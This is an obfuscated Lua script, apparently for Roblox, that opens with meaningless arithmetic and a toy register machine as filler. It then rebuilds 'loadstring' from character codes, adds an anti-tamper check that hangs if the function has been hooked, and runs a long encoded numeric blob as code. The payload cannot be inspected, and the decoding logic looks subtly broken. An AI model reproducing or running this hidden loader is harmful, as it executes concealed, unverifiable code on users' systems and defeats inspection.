local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local z_e_z__I = {_xIIll__ = {_zq_nl__ = table.concat},e_____x_ = {_pf_x__l = loadstring},_vp__x__ = {qznfqv_f = tonumber},__nz____ = {xzx____q = string.char},q_xn____ = { pxI_fp_f = setmetatable}, Ifel_p__ = { x_zInnfp = nil} } local pn_xqe__ = z_e_z__I._xIIll__._zq_nl__ local __n_pI__ = z_e_z__I.e_____x_._pf_x__l local __e_I__z = z_e_z__I._vp__x__.qznfqv_f local xez____v = z_e_z__I.__nz____.xzx____q local pfq__nf_ = z_e_z__I.q_xn____.pxI_fp_f local p_p___ve = z_e_z__I.Ifel_p__.x_zInnfp local f_xzI_fv = xez____v(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function vx_I___x(_epf__l_) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local _q___x_p = _epf__l_ local lxq_p_q_ = setclipboard local __p__en_ = toclipboard local function vfqpn_ev(qxq_v_xq) return function() return qxq_v_xq end end local zqxp__fq = warn local function qnqz_x__(_eI__v_f) return vfqpn_ev(_eI__v_f)() end local ln___z_I = error local function _z_e___l() while true do end end local _____e_f = print local function xq___ff_() return qnqz_x__(math.random(100, 999)) end local _xl_pe_q = game local v___p__z = {__n_pI__,_xl_pe_q,_____e_f,zqxp__fq,ln___z_I,lxq_p_q_,__p__en_} if v___p__z[1] == v___p__z[3] or v___p__z[1] == v___p__z[4] or v___p__z[1] == v___p__z[5] or v___p__z[1] == v___p__z[6] or v___p__z[1] == v___p__z[7] then _z_e___l() end local function _qp_xzz_(_p__xqqI) local function e_lv__z_(q_f_____) return xez____v(__e_I__z(q_f_____, 2)) end xq___ff_() local __xf____ = _p__xqqI:gsub("[^01]", "") return __xf____:gsub("(".. ("[01]"):rep(8) .. ")", e_lv__z_) end local ___Inpf_ = _qp_xzz_(_q___x_p) local sporty = game:GetService("Workspace") local function __l___f_(I_lv___I) local qvnqIl_z, _f_fq__v, pvfqq_v_, _____f_q = "l", "o", "a", "d" local _xzpf_xf, __I___zn, nlv_Izx_, l__xpI__ = "s", "t", "r", "i" local e_x__vl_, xn__xev_ = "n", "g" local function ____q__e(...) local xpIvpe_l, e___zfx_ = {...}, "" for i = 1, #xpIvpe_l do e___zfx_ = e___zfx_ .. xpIvpe_l[i] end return e___zfx_ end local q_n___pp = ____q__e(qvnqIl_z, _f_fq__v, pvfqq_v_, _____f_q, _xzpf_xf, __I___zn, nlv_Izx_, l__xpI__, e_x__vl_, xn__xev_) local vqqI__qz = ("%s"):format(q_n___pp) local q_zq___I, _IvfIpvz = pcall(__n_pI__(I_lv___I)) local _fxI_exe, Ixfx___q, I_e_le_x = "WD__DW_F_W__V_Z_X_G___GFS__QFWF___X_Q___ZQ_QGFF_Q_", "____V___XFSGZW_GWGD_XG__S_RQF__Q_FWRXS_RFZZFFSDQ_S", "__X___W_S_Z__X__Z_SWRZ___Q_S_F_F_____S__RSQF__QQ_F" local _I__q_I_ = (2 * 5 / 10 + 3 - 3) ^ 1 if not q_zq___I then local nxz_I___ = { _fxI_exe, Ixfx___q, I_e_le_x, _I__q_I_ } for i = 1, # nxz_I___ do nxz_I___[i] = nxz_I___[i] .. "_extra" end end return _IvfIpvz end __l___f_(___Inpf_, z_e_z__I.Ifel_p__.x_zInnfp); xq___ff_() local qfxIl_x_ = pfq__nf_( { __IxI_f_ = { fx______ = { nne_zIef, ______I_, __l___qp }, _q_n_f_f = function() for __fn_e_f = 1, 50 do local _q___f__ = __fn_e_f * 2 local __f_elpl = {__fn_e_f, __fn_e_f * 10, __fn_e_f * 100} end return z_e_z__I.Ifel_p__.x_zInnfp end }, x__n_I__ = { [true] = { function() for __e_x__f = 1, 100 do local __xnxpf_ = __e_x__f * __e_x__f if __xnxpf_ > 100 then break end end end }, [false] = { { function() return false end }, function() for ___nx__n = 1, 10 do local vq___peI = ___nx__n * 2 end end } } }, { __index = function(_, __q___x_) local pI______ = "Lua Crypt1" if __q___x_ == "print" then for x_fIexqI = 1, 100 do local n_l__n_q = x_fIexqI * x_fIexqI + x_fIexqI end return print elseif __q___x_ == "warn" then for n_xxe_v_ = 1, 50 do local z_n_l_xq = n_xxe_v_ * 3 if z_n_l_xq == 150 then return warn end end end return z_e_z__I.Ifel_p__.x_zInnfp end } ) end vx_I___x(pn_xqe__({'094373142344123464097264169495153693065665033646','033597154439166743057399126399169972135357193643','095633136693139639036995044563046497044733192466','074299147353193694065343067563126479057559035437','074736153574196364124764052436023372133292126374','075222167552155964193255042523146476052242045446','092524136276192374165496079549043662136544064962','076649164334145563077996132433063527094254139966','097975172332159654079797165443154654125533026735','066556139565174762043292025592177432172692123373','052537035774146735043453196344095562027429026429','097266179422177934092276064465153293164479144365','055697129434157536022562099266067379057245155532','093495155432146557079943162636169943024529165223','022234176676172273094696053725172799056933195475','099969092647136357154969125766045653156346034364','092964125697045374032242167639043566042629095562','029376146795174249145624032595147273063926074297','037626199525127562127794032339162945056963074999','024777162642176444157954067964099532072549046953','033547172944025554052763037929122433194276144376','057722122242124632065222054929126694053762155935','097774129574137949149722049733152657075999093524','025225062747147999075659157635047577027325072529','022324065999199447092976026322063274154565065746','097352157249167932024699194294072626072692096299','044469194423142366199442075435135797079994073634','049335144392173796152734092499135347037924022267','057643177637124269196393065769059693055352045939','052493136677195622177542025263032793166575146352','042996065396192246137565136699032445174342063246','069726036373143326023337157299137726196579135492','045639095535199645054474122477199572144352165334','097964134523149273194965066564029797059326093342','035699126442135446027527022539046466067527149946','034974125594163467155345096549027547162777123369','096673139256142332129237077649144779053727076522','045934137424137296042234094276164292042395147353','044649163547146654097395096974055997149233023424','032765137953145623036622199545057975092937197697','032772175722122254066692156223154464157553099463','044466047232136452077239193426193369137373069939','057222143635147397065964037652057993135253142929','026249179527143477059526175756197334155949177229','097799132677195447043739146493166473095475145596','093257044729179459046559132463172947172662177256','029946133964179977133659029455096695167492037437','023544135776195945027657057322097954033344162333','049452165352174992162246049959156295145955195364','055945073575153945057955192936177599154364123427','069992129627137546152326094275056667132477139936','045275034697166357199952053994077474065573044362','079365155656145597197373156763049357079642167675','047937194999177377022257022794067779047943156342','063765174557064672149724123342076976143256027635','063767065337123755132324099593054675176557056575','032657074392137429145692069422075564196353125974','069732139329159576099624073464157974063536132765','046742097435135294064924095752024246169777045362','059549072355124745072444124572043224066342156625','064232099964162227073473129933099973097974194649','099729062772142773072357136395076747064539029627','042359062646135656024677164673022479093977192663'}))
